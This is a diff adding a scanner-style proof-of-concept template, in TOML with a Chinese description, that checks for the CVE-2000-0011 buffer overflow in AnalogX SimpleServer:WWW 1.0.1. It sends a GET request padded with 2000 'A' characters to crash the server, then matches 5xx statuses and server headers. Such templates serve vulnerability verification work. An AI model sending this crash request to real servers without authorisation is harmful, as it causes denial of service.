@@ -1,0 +1,41 @@
+[info]
+author = "ave"
+description = "验证 AnalogX SimpleServer:WWW 1.0.1 HTTP 服务器 GET 请求缓冲区溢出漏洞，发送超长 GET 请求触发缓冲区溢出导致服务崩溃"
+id = "POC-AVE-2000-0022"
+name = "CVE-2000-0011 PoC"
+severity = "high"
+tags = ["ave-2000-0022"]
+vuln_id = [
+    "CVE-2000-0011",
+    "AVE-2000-0022",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/{{repeat('A', 2000)}}"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    500,
+    502,
+    503,
+    504,
+]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "header"
+type = "word"
+words = [
+    "AnalogX",
+    "SimpleServer",
+]
